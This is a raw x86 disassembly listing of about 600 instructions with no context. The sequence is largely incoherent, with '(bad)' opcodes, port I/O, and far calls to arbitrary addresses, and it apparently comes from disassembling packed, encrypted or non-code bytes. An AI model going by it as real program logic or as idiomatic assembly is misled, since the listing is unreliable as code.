  416534:	inc    ebp
  416535:	mov    ?,ecx
  416537:	cmovbe ecx,DWORD PTR [ebx]
  41653a:	call   0x430e:0xeb004b59
  416541:	sbb    esp,ecx
  416543:	jecxz  0x41652e
  416545:	cs mov ch,0x22
  416548:	xchg   ebp,eax
  416549:	inc    ecx
  41654a:	test   al,0x15
  41654c:	pop    ebp
  41654d:	pop    ebp
  41654e:	lahf   
  41654f:	mov    bh,BYTE PTR [ecx-0x318c287d]
  416555:	xor    eax,0x6db073
  41655a:	ret    0x4ffe
  41655d:	xor    eax,0x29b549b5
  416562:	jecxz  0x4164f8
  416564:	mov    ebp,0xee823d8c
  416569:	push   edx
  41656a:	inc    esp
  41656b:	mov    bl,0x71
  41656d:	cmp    eax,0x9d2a8f5f
  416572:	pop    esp
  416573:	pop    ss
  416574:	aad    0xac
  416576:	out    dx,al
  416577:	add    al,0x49
  416579:	pushf  
  41657a:	js     0x41650e
  41657c:	adc    cl,BYTE PTR [esi]
  41657e:	add    DWORD PTR [ebp-0x75],ebp
  416581:	aad    0xa
  416583:	loop   0x416570
  416585:	ins    BYTE PTR es:[edi],dx
  416586:	lods   eax,DWORD PTR ds:[esi]
  416587:	and    eax,0x30e73ecb
  41658c:	ins    DWORD PTR es:[edi],dx
  41658d:	sub    ch,BYTE PTR [edi+0x15]
  416590:	cmp    dh,BYTE PTR [edi+0x5fb831a8]
  416596:	dec    ebp
  416597:	inc    ebx
  416598:	pop    esp
  416599:	arpl   si,ax
  41659b:	leave  
  41659c:	mov    bl,0xc4
  41659e:	xchg   esi,eax
  41659f:	ins    BYTE PTR es:[edi],dx
  4165a0:	iret   
  4165a1:	loop   0x416540
  4165a3:	add    DWORD PTR ds:0x7e098bd9,ebx
  4165a9:	test   al,0xd3
  4165ab:	enter  0xd65b,0xc3
  4165af:	cwde   
  4165b0:	test   BYTE PTR [ebp+0x70],0xa0
  4165b4:	or     al,BYTE PTR [eax+0x7b]
  4165b7:	bound  ecx,QWORD PTR [edi+esi*4-0x7182997a]
  4165be:	or     eax,0xbf0333f4
  4165c3:	pop    bx
  4165c5:	mov    ds:0xba5c6475,eax
  4165ca:	data16 add ch,cl
  4165cd:	add    BYTE PTR [ecx],0xf
  4165d0:	sub    DWORD PTR [eax-0x5e],ebx
  4165d3:	mov    esi,0x3b3796e9
  4165d8:	out    dx,al
  4165d9:	out    dx,eax
  4165da:	or     ecx,ebx
  4165dc:	mov    ebp,0x5686b8d2
  4165e1:	sbb    cl,BYTE PTR [ebp+0x5a]
  4165e4:	iret   
  4165e5:	jo     0x416612
  4165e7:	mov    edi,0x633921c4
  4165ec:	sub    edi,DWORD PTR ds:0x65ab2e96
  4165f2:	add    cl,BYTE PTR [eax+0x77]
  4165f5:	mov    esp,0x9f518e08
  4165fa:	(bad)  
  4165fb:	dec    ebp
  4165fc:	lods   al,BYTE PTR ds:[esi]
  4165fd:	inc    ebp
  4165fe:	scas   eax,DWORD PTR es:[edi]
  4165ff:	sti    
  416600:	rcr    DWORD PTR [edx],cl
  416602:	out    0x26,al
  416604:	push   ds
  416605:	dec    edx
  416606:	xor    ah,BYTE PTR [edx+0xf]
  416609:	retf   0x3c50
  41660c:	and    ebp,esp
  41660e:	push   ecx
  41660f:	adc    BYTE PTR [edx],cl
  416611:	in     eax,dx
  416612:	sub    al,0xb2
  416614:	inc    ebp
  416615:	dec    ebp
  416616:	mov    ds:0x25951a79,eax
  41661b:	gs loop 0x4165a0
  41661e:	shl    BYTE PTR [ebx+0xffa9e7d],1
  416624:	in     eax,dx
  416625:	mov    ds:0xc7e8961,eax
  41662a:	jns    0x4165fc
  41662c:	dec    esi
  41662d:	sub    dl,BYTE PTR [edi-0x63]
  416630:	(bad)  
  416631:	sbb    al,0xa7
  416633:	fsub   DWORD PTR [edx+0x48]
  416636:	ins    BYTE PTR es:[edi],dx
  416637:	aad    0x3a
  416639:	dec    esp
  41663a:	out    dx,eax
  41663b:	test   eax,0x53315976
  416640:	lds    eax,FWORD PTR [ecx-0x1f]
  416643:	repz mov ds:0x3b605137,eax
  416649:	or     edx,DWORD PTR ds:0x61a4da0f
  41664f:	retf   0xa89f
  416652:	stos   DWORD PTR es:[edi],eax
  416653:	and    eax,0x5be2f333
  416658:	aam    0x97
  41665a:	add    cl,BYTE PTR [edi-0x37e28b5a]
  416660:	jnp    0x41669f
  416662:	mov    ds:0x407ef7d1,eax
  416667:	inc    ebp
  416668:	xchg   dl,ch
  41666a:	dec    eax
  41666b:	aad    0xc7
  41666d:	dec    ebp
  41666e:	shl    DWORD PTR ds:0x3596ce85,1
  416674:	lods   al,BYTE PTR ds:[esi]
  416675:	and    bh,BYTE PTR cs:[eiz*4-0xaeb1c7]
  41667d:	(bad)  
  41667e:	gs sub ah,al
  416681:	mov    eax,ds:0x33189e21
  416686:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416687:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416688:	and    DWORD PTR [ebx+0x3f],ebp
  41668b:	(bad)  
  41668c:	push   edi
  41668d:	pop    esp
  41668e:	mov    eax,ds:0xc5633d99
  416693:	adc    cl,BYTE PTR [ebp+0x7e4e2e7e]
  416699:	pop    ebx
  41669a:	popa   
  41669b:	hlt    
  41669c:	test   dh,cl
  41669e:	inc    esi
  41669f:	jmp    0xd4c8da18
  4166a4:	sub    ah,ah
  4166a6:	enter  0x665f,0xb4
  4166aa:	fbld   TBYTE PTR [ecx]
  4166ac:	popf   
  4166ad:	and    eax,0x786246eb
  4166b2:	pop    ebp
  4166b3:	adc    ah,BYTE PTR [edi+0x74897acf]
  4166b9:	or     edi,DWORD PTR [ecx]
  4166bb:	les    ecx,FWORD PTR [edi]
  4166bd:	sub    eax,0xb3e49ca9
  4166c2:	mov    eax,0xa61456b9
  4166c7:	sar    DWORD PTR [ebp+0xe],1
  4166ca:	mov    edx,0x9a66d00b
  4166cf:	sub    BYTE PTR [edx],dh
  4166d1:	xor    DWORD PTR [eax+edx*4+0x21],ecx
  4166d5:	and    edi,DWORD PTR [esi-0x5d]
  4166d8:	cmc    
  4166d9:	pop    ecx
  4166da:	test   al,0x3
  4166dc:	mov    ebp,0x3850049c
  4166e1:	mov    edi,0xb11a005a
  4166e6:	pop    ebp
  4166e7:	pop    eax
  4166e8:	clc    
  4166e9:	out    dx,eax
  4166ea:	pop    edx
  4166eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166ec:	sub    ecx,esi
  4166ee:	or     BYTE PTR [edi+eax*2+0x17],0x5b
  4166f3:	push   esi
  4166f4:	dec    ecx
  4166f5:	stos   DWORD PTR es:[edi],eax
  4166f6:	out    dx,al
  4166f7:	mov    edi,0xb6b487bc
  4166fc:	mov    ch,0x4e
  4166fe:	push   ss
  4166ff:	jle    0x4166db
  416701:	ret    
  416702:	xchg   esi,eax
  416703:	lds    ecx,FWORD PTR [eax-0x7d]
  416706:	sub    bh,BYTE PTR [esi+0x6b125059]
  41670c:	jl     0x416726
  41670e:	or     BYTE PTR [ecx+0x4],bh
  416711:	xor    BYTE PTR [ecx+0x27af3257],ch
  416717:	cmp    esi,DWORD PTR [ebx]
  416719:	adc    ebx,ebp
  41671b:	adc    BYTE PTR [ebx],bh
  41671d:	inc    esi
  41671e:	out    0x91,eax
  416720:	xor    al,0x5a
  416722:	push   ds
  416723:	push   ss
  416724:	cwde   
  416725:	lods   al,BYTE PTR ds:[esi]
  416726:	mov    BYTE PTR [eax],dh
  416728:	sub    edx,DWORD PTR [ebp-0x6980428f]
  41672e:	sahf   
  41672f:	push   esi
  416730:	(bad)  
  416732:	loop   0x41675d
  416734:	mov    ds,WORD PTR [edx-0x21e7d186]
  41673a:	and    ah,BYTE PTR [edi-0x6e]
  41673d:	out    0xe5,al
  41673f:	push   ds
  416740:	jb     0x41679d
  416742:	lods   al,BYTE PTR ds:[esi]
  416743:	je     0x4167c0
  416745:	dec    ebp
  416746:	gs inc edx
  416748:	fldlg2 
  41674a:	inc    ebx
  41674b:	test   al,0xfe
  41674d:	nop
  41674e:	ret    0x2b3d
  416751:	sub    DWORD PTR [edi-0x52],edx
  416754:	mov    bh,0x49
  416756:	cwde   
  416757:	push   ebp
  416758:	(bad)  
  416759:	mov    al,0xde
  41675b:	call   0x97d772a2
  416760:	outs   dx,BYTE PTR ds:[esi]
  416761:	xor    edx,DWORD PTR [esp+ebx*4]
  416764:	into   
  416765:	loop   0x41671e
  416767:	push   edi
  416768:	gs ror bh,cl
  41676b:	sbb    ecx,DWORD PTR gs:[esi+0x4e]
  41676f:	sahf   
  416770:	popf   
  416771:	fwait
  416772:	ds loope 0x41672f
  416775:	retf   
  416776:	push   ds
  416777:	mov    ebp,0x7969ba13
  41677c:	sub    bh,BYTE PTR [ecx*2-0x3186df6c]
  416783:	dec    esp
  416784:	xor    al,0xe3
  416786:	add    dh,ah
  416788:	ja     0x4167e1
  41678a:	add    edi,DWORD PTR [ebx+0x6eb9d534]
  416790:	shl    BYTE PTR [edi-0xd],1
  416793:	xlat   BYTE PTR ds:[ebx]
  416794:	pop    ebp
  416795:	xor    DWORD PTR [esi+0x6f],eax
  416798:	call   0x94af:0x88682f7f
  41679f:	ret    0x29db
  4167a2:	(bad)  
  4167a3:	mov    BYTE PTR [ecx],0xf3
  4167a6:	push   esp
  4167a7:	sub    edi,DWORD PTR [ebx+0x6e7b1253]
  4167ad:	xor    bh,bl
  4167af:	or     BYTE PTR [bp-0x6e],al
  4167b3:	das    
  4167b4:	xchg   esi,eax
  4167b5:	mov    edx,DWORD PTR [ebp-0x38]
  4167b8:	outs   dx,BYTE PTR ds:[esi]
  4167b9:	jle    0x4167dc
  4167bb:	jne    0x416759
  4167bd:	ds pop ecx
  4167bf:	adc    al,0xff
  4167c1:	sbb    ebx,DWORD PTR [ecx+0x4]
  4167c4:	js     0x4167bb
  4167c6:	jne    0x4167fa
  4167c8:	inc    esp
  4167c9:	fcmovnb st,st(5)
  4167cb:	enter  0xe0af,0x5e
  4167cf:	bound  esi,QWORD PTR [esi+0x3e]
  4167d2:	xor    BYTE PTR [ebp-0x32],0xcf
  4167d6:	sub    bl,BYTE PTR cs:[ecx+0x3093227b]
  4167dd:	mov    ebp,0x66a76464
  4167e2:	fisttp DWORD PTR [edi+0x17a3bcf1]
  4167e8:	cmp    DWORD PTR [edx-0xe81d50f],esp
  4167ee:	mov    ds,WORD PTR [esi-0x4a]
  4167f1:	bound  edi,QWORD PTR [ebp+0x6886e87b]
  4167f7:	enter  0x7f98,0xa7
  4167fb:	xchg   ebx,eax
  4167fc:	jecxz  0x41686b
  4167fe:	pop    eax
  4167ff:	mov    al,ch
  416801:	ins    BYTE PTR es:[edi],dx
  416802:	int3   
  416803:	sub    eax,0x10b1911d
  416808:	das    
  416809:	imul   edi,eax,0xd102f81d
  41680f:	les    eax,FWORD PTR cs:[eax+0x73]
  416813:	jmp    DWORD PTR ds:0x57b309a
  416819:	std    
  41681a:	and    eax,DWORD PTR [ebp*1+0x6ac66055]
  416821:	sub    DWORD PTR [edx-0x72b50371],0x6f
  416828:	jb     0x416811
  41682a:	mov    edx,0x2b5be743
  41682f:	cs dec ebx
  416831:	xor    eax,0xa4160f36
  416836:	mov    al,ds:0x64e18352
  41683b:	mov    DWORD PTR [edx+0x2e2f2a3f],esi
  416841:	hlt    
  416842:	(bad)  
  416843:	mov    edi,0x458ee89d
  416848:	add    edx,ebp
  41684a:	fdivp  st(1),st
  41684c:	adc    DWORD PTR [ebp+esi*4-0x561f1970],edx
  416853:	(bad)  [eax]
  416855:	pushf  
  416856:	pop    ss
  416857:	push   esi
  416858:	je     0x416890
  41685a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41685b:	and    esi,edi
  41685d:	scas   eax,DWORD PTR es:[edi]
  41685e:	push   esp
  41685f:	mov    BYTE PTR [ecx-0x33ff3246],cl
  416865:	ret    
  416866:	ins    DWORD PTR es:[edi],dx
  416867:	dec    ebp
  416868:	ins    DWORD PTR es:[edi],dx
  416869:	or     eax,DWORD PTR ss:[edx-0x4b]
  41686d:	jno    0x41687b
  41686f:	inc    ecx
  416870:	out    dx,eax
  416871:	pop    ecx
  416872:	ds (bad) 
  416874:	inc    ebx
  416875:	jmp    0x4168ef
  416877:	out    dx,eax
  416878:	sub    eax,0xa69d49a9
  41687d:	(bad)  
  41687f:	push   ebx
  416880:	aad    0x9e
  416882:	mov    ds:0xcffb0838,al
  416887:	push   cs
  416888:	jle    0x416828
  41688a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41688b:	rcr    DWORD PTR [ebp-0x15],cl
  41688e:	add    ebp,ebx
  416890:	fisubr WORD PTR [edx+ecx*1-0x5e]
  416894:	or     cl,BYTE PTR [ecx-0x42]
  416897:	out    0x22,eax
  416899:	xchg   edi,eax
  41689a:	mov    bl,0x66
  41689c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41689d:	lahf   
  41689e:	xchg   ebp,eax
  41689f:	jmp    0x12af:0x4419778c
  4168a6:	iret   
  4168a7:	sbb    al,0x39
  4168a9:	cmc    
  4168aa:	daa    
  4168ab:	outs   dx,BYTE PTR ds:[esi]
  4168ac:	push   ebx
  4168ad:	push   esp
  4168ae:	pop    ss
  4168af:	sahf   
  4168b0:	xchg   ebx,eax
  4168b1:	adc    BYTE PTR [eax-0x4481378a],dl
  4168b7:	mov    edx,0x20ddd357
  4168bc:	xor    eax,0xbbc1f39c
  4168c1:	fadd   DWORD PTR [esi-0x46d2b3f1]
  4168c7:	mov    BYTE PTR [ebp+0x20],ah
  4168ca:	cmp    al,0xec
  4168cc:	xor    DWORD PTR [ecx-0x28],eax
  4168cf:	fst    DWORD PTR [esi+0x713bb837]
  4168d5:	adc    al,0x52
  4168d7:	ja     0x416922
  4168d9:	or     eax,0x28cd2397
  4168de:	jmp    0xf3d5:0xd55ce883
  4168e5:	sbb    eax,0x25d1d5e0
  4168ea:	mov    edx,0xbfa666b9
  4168ef:	lods   eax,DWORD PTR ds:[esi]
  4168f0:	out    0x41,eax
  4168f2:	jns    0x416935
  4168f4:	sbb    DWORD PTR [esp+eax*4+0x4c20176],ecx
  4168fb:	and    BYTE PTR [edi+0x32],cl
  4168fe:	add    DWORD PTR [ecx],esi
  416900:	dec    edx
  416901:	outs   dx,BYTE PTR ds:[esi]
  416902:	mov    ax,bp
  416905:	inc    esp
  416906:	mov    dl,BYTE PTR [esi]
  416908:	adc    al,0x22
  41690a:	inc    esp
  41690b:	xchg   esi,edi
  41690d:	nop
  41690e:	stc    
  41690f:	shl    BYTE PTR [eax],cl
  416911:	mov    WORD PTR [ebx+0x4c89b1f6],?
  416917:	cmp    ah,BYTE PTR es:[edi]
  41691a:	cmp    eax,0x7c8e4475
  41691f:	sub    dh,BYTE PTR [eax+0x59662b50]
  416925:	sti    
  416926:	daa    
  416927:	outs   dx,DWORD PTR ds:[esi]
  416928:	mov    ds:0x25bc0cc9,eax
  41692d:	aad    0x55
  41692f:	sbb    eax,0x8677e2ff
  416934:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416936:	mov    WORD PTR [ebx-0x5a9e8aae],cs
  41693c:	pop    edx
  41693d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41693e:	cwde   
  41693f:	sbb    BYTE PTR [edx-0x57],dh
  416942:	cmp    eax,0x50efb1f8
  416947:	in     eax,dx
  416948:	repz lock (bad) 
  41694b:	sahf   
  41694c:	inc    ecx
  41694d:	icebp  
  41694e:	(bad)  
  41694f:	test   BYTE PTR [edx-0x4fc2acac],0x1d
  416956:	xor    DWORD PTR [ebp+0x7d],edx
  416959:	int3   
  41695a:	es push 0xef38e921
  416960:	das    
  416961:	addr16 mov esi,0x8b4bbe10
  416967:	pop    esi
  416968:	lahf   
  416969:	dec    DWORD PTR [ebx-0x3060942a]
  41696f:	and    DWORD PTR ds:[ecx+0x51],ebp
  416973:	inc    ebx
  416974:	inc    edx
  416975:	aad    0xda
  416977:	dec    ecx
  416978:	sbb    BYTE PTR [esi+0x42],bh
  41697b:	sub    BYTE PTR [esi+edi*2-0x1a6ae8c4],al
  416982:	jge    0x4169a3
  416984:	mov    fs,WORD PTR [ebx]
  416986:	call   0x2052:0x207d7589
  41698d:	call   0xd462c5be
  416992:	out    0x45,eax
  416994:	pop    ds
  416995:	shr    BYTE PTR [edi-0x43],cl
  416998:	leave  
  416999:	cmp    ch,BYTE PTR [esi-0x7e42aa4b]
  41699f:	mov    cl,0x97
  4169a1:	adc    BYTE PTR [edx+0x1a],0x1
  4169a5:	pushf  
  4169a6:	test   al,0x28
  4169a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169aa:	test   al,0xce
  4169ac:	ins    DWORD PTR es:[edi],dx
  4169ad:	and    DWORD PTR [ebx-0x776b318],ecx
  4169b3:	ret    0xb5c
  4169b6:	mov    cl,BYTE PTR [ecx-0x656212dd]
  4169bc:	cmp    al,0x8f
  4169be:	sub    al,0xb9
  4169c0:	out    dx,eax
  4169c1:	clc    
  4169c2:	inc    edi
  4169c3:	jl     0x416956
  4169c5:	xor    dh,BYTE PTR [eax]
  4169c7:	outs   dx,BYTE PTR ds:[esi]
  4169c8:	jp     0x4169af
  4169ca:	aad    0x45
  4169cc:	sbb    BYTE PTR [ecx+ebx*2-0x42e573eb],dh
  4169d3:	dec    eax
  4169d4:	out    dx,eax
  4169d5:	and    edi,edx
  4169d7:	aad    0xa8
  4169d9:	aaa    
  4169da:	in     al,dx
  4169db:	mov    dl,0xb9
  4169dd:	mov    ebx,0x9afc563f
  4169e2:	(bad)  
  4169e3:	rol    cl,1
  4169e5:	nop
  4169e6:	ss xor al,0x71
  4169e9:	adc    BYTE PTR [eax+edx*1],0x1a
  4169ed:	mov    cl,0x46
  4169ef:	or     dl,dh
  4169f1:	lds    edi,FWORD PTR [edi]
  4169f3:	lock or ah,BYTE PTR [ebx-0x62c806b2]
  4169fa:	out    0x1b,eax
  4169fc:	popf   
  4169fd:	inc    edi
  4169fe:	ss cmp ah,dl
  416a01:	std    
  416a02:	cmp    edi,DWORD PTR [eax]
  416a04:	jl     0x416a35
  416a06:	push   0xffffffc0
  416a08:	or     al,0xa8
  416a0a:	(bad)  
  416a0b:	xchg   ebp,eax
  416a0c:	lods   eax,DWORD PTR ds:[esi]
  416a0d:	cld    
  416a0e:	adc    DWORD PTR [edi+0x32],eax
  416a11:	mov    ebp,0x687d42d5
  416a16:	and    ecx,edx
  416a18:	mov    edx,0xdcb29b22
  416a1d:	mov    eax,ds:0xa775b6c0
  416a22:	dec    ecx
  416a23:	fs push eax
  416a25:	mov    dh,ah
  416a27:	xor    al,0x83
  416a29:	fdiv   DWORD PTR [ecx+0x33]
  416a2c:	pushf  
  416a2d:	lock cmp al,0xb7
  416a30:	imul   eax,eax,0xa5835ccf
  416a36:	or     esi,ecx
  416a38:	aas    
  416a39:	imul   esi,esi,0xffffffca
  416a3c:	test   al,0xc5
  416a3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a3f:	fwait
  416a40:	popa   
  416a41:	not    DWORD PTR [esi+0xb]
  416a44:	pop    esp
  416a45:	test   al,0xcf
  416a47:	dec    ebp
  416a48:	fs pop esp
  416a4a:	adc    bl,BYTE PTR ds:0x99910f97
  416a50:	popa   
  416a51:	dec    esp
  416a52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a53:	or     eax,0xabf2ce9
  416a58:	jecxz  0x416a9b
  416a5a:	mov    cl,0x97
  416a5c:	cdq    
  416a5d:	(bad)  
  416a5e:	mov    ebx,0x3351e28f
  416a63:	sbb    ch,BYTE PTR [eax-0x23b7ac3d]
  416a69:	test   eax,0x450aef3
  416a6e:	inc    ax
  416a70:	(bad)  
  416a71:	call   0x86fa946a
  416a76:	pop    edi
  416a77:	arpl   si,ax
  416a79:	push   ebp
  416a7a:	shr    ah,0xf2
  416a7d:	ret    0xf7d9
  416a80:	jle    0x416a73
  416a82:	fs jl  0x416ab0
  416a85:	or     bh,BYTE PTR [edx+0x34]
  416a88:	xchg   BYTE PTR [ebx],ah
  416a8a:	xor    DWORD PTR [ecx-0x37],edx
  416a8d:	inc    edi
  416a8e:	js     0x416ab3
  416a90:	pop    edx
  416a91:	push   ds
  416a92:	pusha  
  416a93:	ss or  bh,ch
  416a96:	test   al,0xef
  416a98:	test   BYTE PTR [ecx+0x31d6db19],dl
  416a9e:	int    0xf
  416aa0:	ja     0x416a82
  416aa2:	out    dx,al
  416aa3:	or     cl,ah
  416aa5:	test   al,0xc4
  416aa7:	cmp    ebp,0xac4ee141
  416aad:	inc    esi
  416aae:	adc    esi,esi
  416ab0:	ror    BYTE PTR [esi+0x35],0x9f
  416ab4:	cwde   
  416ab5:	adc    DWORD PTR [eax+eax*2],0xaba758d7
  416abc:	xor    eax,0x32341fac
  416ac1:	mov    edx,0x1d9e09d6
  416ac6:	or     esi,esi
  416ac8:	cmp    esp,DWORD PTR [ebx-0x42]
  416acb:	mov    dh,0x7c
  416acd:	jb     0x416ae4
  416acf:	add    eax,0x23ef5f3b
  416ad4:	adc    al,0x7c
  416ad6:	sbb    ebp,ecx
  416ad8:	sub    edi,DWORD PTR [ebx+0x5d0b2d3e]
  416ade:	mov    DWORD PTR [eax-0x15],esi
  416ae1:	dec    edi
  416ae2:	mov    cl,0x75
  416ae4:	outs   dx,BYTE PTR ds:[esi]
  416ae5:	adc    al,BYTE PTR [esi-0x3be468a3]
  416aeb:	jecxz  0x416ab3
  416aed:	fild   DWORD PTR [ecx-0x1268f60c]
  416af3:	mov    esi,ebp
  416af5:	and    BYTE PTR [esi-0x7a3d734f],dl
  416afb:	mov    ecx,DWORD PTR [esi+0x3e]
  416afe:	int3   
  416aff:	je     0x416b40
  416b01:	sub    bl,ah
  416b03:	pop    es
  416b04:	test   DWORD PTR [ebp+0x7],ecx
  416b07:	(bad)  
  416b08:	cwde   
  416b09:	imul   eax,DWORD PTR [ebp-0x3c],0xfffffffe
  416b0d:	nop
  416b0e:	and    dl,BYTE PTR [edx+0x29a7bdc0]
  416b14:	push   esp
  416b15:	(bad)  
  416b16:	xor    ecx,DWORD PTR [ebx]
  416b18:	out    dx,eax
  416b19:	jge    0x416b80
  416b1b:	mov    WORD PTR [eax],cs
  416b1d:	repnz mov ?,WORD PTR [edx]
  416b20:	push   esp
  416b21:	ret    
  416b22:	hlt    
  416b23:	jns    0x416adf
  416b25:	pushf  
  416b26:	dec    BYTE PTR [esi*1+0x114814b5]
  416b2d:	jp     0x416ae0
  416b2f:	jge    0x416b2b
  416b31:	inc    ebx
  416b32:	call   0x4aa2:0x5500444f
  416b39:	fiadd  WORD PTR [ebx-0x7b]
  416b3c:	mov    ds:0x1030c581,eax
  416b41:	lea    edi,[ebx+0x74]
  416b44:	xchg   DWORD PTR [ebx+0x49],ebx
  416b47:	bsr    edx,DWORD PTR [edx]
  416b4a:	sbb    DWORD PTR [ecx-0x631b9878],edi
  416b50:	inc    BYTE PTR [esi]
  416b52:	dec    esi
  416b53:	cmp    eax,0x287f377b
  416b58:	push   ss
  416b59:	aas    
  416b5a:	mov    eax,ds:0xc6a66857
  416b5f:	pop    esi
  416b60:	fisub  WORD PTR [eax-0x607af464]
  416b66:	add    DWORD PTR [esi+0x61],edx
  416b69:	jb     0x416be0
  416b6b:	rcr    bl,1
  416b6d:	mov    ebx,0xc3ed4a20
  416b72:	mov    WORD PTR [edx+0x89ce7e3],cs
  416b78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b79:	mov    ecx,0x14ded0da
  416b7e:	fist   DWORD PTR [edx-0x2a]
  416b81:	mov    ds:0xe9f16a78,al
  416b86:	ret    
  416b87:	pop    esp
  416b88:	inc    esi
  416b89:	jl     0x416b4a
  416b8b:	out    dx,al
  416b8c:	fnstcw WORD PTR [ebp-0x4c06ab5f]
  416b92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b93:	loope  0x416bc9
  416b95:	(bad)  [ebx-0x60eede8b]
  416b9b:	or     al,0xa9
  416b9d:	push   cx
  416b9f:	gs mov ecx,0xcd9c8ee9
  416ba5:	ss ret 
  416ba7:	or     ecx,DWORD PTR [esi]
  416ba9:	pop    ebx
  416baa:	xchg   ebp,eax
  416bab:	jnp    0x416be4
  416bad:	jl     0x416c10
  416baf:	inc    esi
  416bb0:	(bad)  
  416bb1:	(bad)
  416bb4:	xor    BYTE PTR [ebp-0x32a947ef],0x34
  416bbb:	mov    ds:0x11e27a9f,al
  416bc0:	pop    edi
  416bc1:	xchg   ecx,eax
  416bc2:	fs xor eax,0xb37d7b7
  416bc8:	push   0xffffff96
  416bca:	daa    
  416bcb:	mov    esi,0x4a0c662c
  416bd0:	(bad)  
  416bd1:	fild   DWORD PTR [ecx+eax*8]
  416bd4:	(bad)  
  416bd5:	pop    esp
  416bd6:	cmp    BYTE PTR [eax-0x3d8fe9e9],0x8c
  416bdd:	rcr    BYTE PTR [ebp-0x78b98f4d],1
  416be3:	arpl   WORD PTR [esp+ebx*4],si
  416be6:	xchg   edx,eax
  416be7:	lds    ebx,FWORD PTR [edi-0xc]
  416bea:	add    edi,DWORD PTR [edi-0x5778e5ef]
  416bf0:	xchg   ebp,eax
  416bf1:	mov    eax,0x433c7869
  416bf6:	loopne 0x416bee
  416bf8:	jno    0x416bf0
  416bfa:	mov    ebx,0xa7c253c4
  416bff:	adc    eax,0xf8abd6d5
  416c04:	pop    eax
  416c05:	aam    0x5d
  416c07:	add    eax,0xafe5f8a1
  416c0c:	sub    ah,dl
  416c0e:	dec    esi
  416c0f:	sub    ecx,DWORD PTR [ecx-0x5d74abd1]
  416c15:	daa    
  416c16:	jg     0x416b98
  416c18:	stos   BYTE PTR es:[edi],al
  416c19:	lods   al,BYTE PTR ds:[esi]
  416c1a:	fwait
  416c1b:	mov    cl,0x35
  416c1d:	rcr    DWORD PTR [ebp+0x1b],cl
  416c20:	hlt    
  416c21:	cmp    dl,dl
  416c23:	repz repz push cs
  416c26:	aas    
  416c27:	pop    esp
  416c28:	xor    cl,ah
  416c2a:	and    DWORD PTR [esi+0x26],edi
  416c2d:	mov    bl,0x1c
  416c2f:	xchg   ebx,eax
  416c30:	mul    BYTE PTR [eax-0x172d1a5]
  416c36:	mov    al,bh
  416c38:	mov    eax,0x6622c6a9
  416c3d:	ds mov ebp,0xed6eae57
  416c43:	and    edi,eax
  416c45:	daa    
  416c46:	retf   
  416c47:	fs inc esp
  416c49:	push   cs
  416c4a:	iret   
  416c4b:	bound  esi,QWORD PTR [ebx]
  416c4d:	push   edx
  416c4e:	mov    eax,0x18431890
  416c53:	or     DWORD PTR ds:0xfda6f976,edx
  416c59:	sbb    eax,0xba82e82c
  416c5e:	inc    eax
  416c5f:	sub    esi,eax
  416c61:	cmp    ch,ch
  416c63:	out    dx,eax
  416c64:	mov    esi,0xfe274c36
  416c69:	sti    
  416c6a:	jne    0x416bf2
  416c6c:	and    al,0x3c
  416c6e:	int3   
  416c6f:	lahf   
  416c70:	gs inc ebp
  416c72:	in     al,dx
  416c73:	es retf 
  416c75:	add    eax,0x1a870ce6
  416c7a:	aad    0xbf
  416c7c:	popf   
  416c7d:	mov    ds:0x13d965c5,al
  416c82:	jmp    0x7429:0x28e0f54c
  416c89:	sar    DWORD PTR [ebp-0x31],0x15
  416c8d:	gs pusha 
  416c8f:	test   DWORD PTR [esi+0x48],edx
  416c92:	sub    BYTE PTR [edx-0x52efdcd6],ch
  416c98:	sub    ah,al
  416c9a:	mov    ch,0x33
  416c9c:	int3   
  416c9d:	sbb    eax,0x504959b9
  416ca2:	sti    
  416ca3:	call   0x2020:0x7e6825f5
  416caa:	push   esp
  416cab:	pop    ecx
  416cac:	imul   ebp,esp,0x88006bbe
  416cb2:	pop    ds
  416cb3:	mov    dl,0xd6
  416cb5:	pop    ss
  416cb6:	and    edx,esi
  416cb8:	cmp    BYTE PTR [esp+ecx*2-0x4e7cf3e9],al
  416cbf:	inc    edi
  416cc0:	mov    ah,0xd2
  416cc2:	adc    al,0x17
  416cc4:	jns    0x416d19
  416cc6:	les    esi,FWORD PTR [edx+0x4b]
  416cc9:	aad    0x90
  416ccb:	inc    ebx
  416ccc:	xlat   BYTE PTR ds:[ebx]
  416ccd:	fcomi  st,st(1)
  416ccf:	fisub  DWORD PTR [ebp-0x1a248232]
  416cd5:	xchg   ecx,eax
  416cd6:	adc    DWORD PTR [esi-0x5b],ecx
  416cd9:	pushf  
  416cda:	lds    edi,FWORD PTR [esp+ebp*8-0x5a]
  416cde:	jmp    0xc0c6c95f
  416ce3:	nop
  416ce4:	fucomip st,st(4)
  416ce6:	fiadd  WORD PTR [eax-0x58]
  416ce9:	std    
  416cea:	call   0x859e7b00
  416cef:	and    DWORD PTR [ebp+0x6],0x55c8d821
  416cf6:	mov    edi,0xf68e3fb1
  416cfb:	call   0x2586f351
  416d00:	ss push es
  416d02:	and    ah,dh
  416d04:	sbb    ebx,ebx
  416d06:	ds iret 
  416d08:	cmp    al,0x80
  416d0a:	jnp    0x416c9e
  416d0c:	out    0xc5,al
  416d0e:	adc    DWORD PTR [esi+0x4],ebx
  416d11:	stos   BYTE PTR es:[edi],al
  416d12:	dec    eax
  416d13:	xor    al,0x0
  416d15:	fstp   DWORD PTR [ebx+0x42]
  416d18:	xchg   DWORD PTR [ebx+ebx*1-0x77863fd1],esi
  416d1f:	mov    cl,0x52
  416d21:	inc    ebx
  416d22:	and    ecx,DWORD PTR [esi]
  416d24:	push   esi
  416d25:	xor    al,0x27
  416d27:	add    eax,0x96e78f74
  416d2c:	mov    bh,0x24
  416d2e:	or     DWORD PTR [ebp-0x30af022],eax
